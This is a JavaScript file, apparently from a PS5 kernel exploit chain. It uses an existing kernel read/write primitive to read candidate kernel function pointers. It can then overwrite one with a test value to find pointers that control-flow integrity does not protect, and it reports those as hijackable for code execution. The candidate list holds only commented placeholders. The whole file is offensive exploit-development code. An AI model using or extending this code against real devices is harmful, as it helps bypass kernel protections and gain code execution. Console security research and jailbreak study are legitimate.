///////////////////////////////////////////////////////////////////////////////
// FUNCTION POINTER CFI TESTER
// Add this to main.js after the APIC read test
// Tests function pointers to find ones NOT protected by CFI
//
// USAGE: Uncomment testIndex to test specific candidate
//        If PS5 crashes = CFI protected
//        If no crash = EXPLOITABLE!
///////////////////////////////////////////////////////////////////////////////

// Priority candidates (known often-unprotected FreeBSD structures)
// These are offsets from kdataBase - UPDATE WITH VALUES FROM find_all_fptrs.py
const fptr_candidates = [
    // FORMAT: { offset: 0x..., name: 'struct_name', ptr_offset: 0 }
    // ptr_offset = which pointer in struct to test (0 = first, 8 = second, etc.)

    // Example candidates - REPLACE WITH ACTUAL VALUES FROM YOUR SCAN:
    // { offset: 0x28B7F8, name: 'candidate_28ptr', ptr_offset: 0 },
    // { offset: 0x27ED60, name: 'candidate_27ptr', ptr_offset: 0 },
    // Add more from find_all_fptrs.py output...
];

// Which candidate to test (null = just read all, number = write test that one)
const testIndex = null;  // Change to 0, 1, 2, etc. to test specific candidate

async function runFptrTest(krw, log, LogLevel) {
    await log("[FPTR TEST] Starting function pointer CFI test...", LogLevel.INFO);
    await log("[FPTR TEST] kdataBase = 0x" + krw.kdataBase, LogLevel.INFO);

    // Read all candidates first
    for (let i = 0; i < fptr_candidates.length; i++) {
        const c = fptr_candidates[i];
        const addr = krw.kdataBase.add32(c.offset + c.ptr_offset);

        try {
            const val = await krw.read8(addr);
            const isValid = (val.hi >>> 0) === 0xffffffff &&
                           ((val.low >>> 24) & 0xff) >= 0xd0;

            await log(`[FPTR ${i}] ${c.name} @ +0x${c.offset.toString(16)} = 0x${val} ${isValid ? '✓' : '✗'}`,
                     isValid ? LogLevel.INFO : LogLevel.WARN);
        } catch (e) {
            await log(`[FPTR ${i}] ${c.name} - READ FAILED: ${e}`, LogLevel.ERROR);
        }
    }

    // If testIndex is set, do write test on that candidate
    if (testIndex !== null && testIndex < fptr_candidates.length) {
        const c = fptr_candidates[testIndex];
        const addr = krw.kdataBase.add32(c.offset + c.ptr_offset);

        const proceed = confirm(
            `CFI WRITE TEST\n\n` +
            `Candidate: ${c.name}\n` +
            `Address: 0x${addr}\n` +
            `Offset: 0x${c.offset.toString(16)}\n\n` +
            `This will write 0x4141414141414141 to test CFI.\n` +
            `If PS5 CRASHES = CFI protected\n` +
            `If NO CRASH = EXPLOITABLE!\n\n` +
            `Proceed?`
        );

        if (proceed) {
            await log(`[FPTR TEST] Writing 0x4141414141414141 to ${c.name}...`, LogLevel.WARN);

            // Read original value first
            const original = await krw.read8(addr);
            await log(`[FPTR TEST] Original value: 0x${original}`, LogLevel.INFO);

            // Write test value
            await krw.write8(addr, new int64(0x41414141, 0x41414141));

            // If we get here, CFI didn't catch it!
            await log(`[FPTR TEST] WRITE SUCCEEDED - NO CFI CRASH!`, LogLevel.SUCCESS);
            await log(`[FPTR TEST] ${c.name} is EXPLOITABLE!`, LogLevel.SUCCESS);

            // Restore original value
            await krw.write8(addr, original);
            await log(`[FPTR TEST] Restored original value`, LogLevel.INFO);

            alert(
                `SUCCESS!\n\n` +
                `${c.name} at offset 0x${c.offset.toString(16)} is NOT CFI protected!\n\n` +
                `This pointer can be hijacked for code execution!`
            );
        }
    } else if (testIndex !== null) {
        await log(`[FPTR TEST] Invalid testIndex: ${testIndex}`, LogLevel.ERROR);
    } else {
        await log("[FPTR TEST] Read-only mode. Set testIndex to test a specific candidate.", LogLevel.INFO);
    }
}

// Export for use in main.js
// Call: await runFptrTest(krw, log, LogLevel);
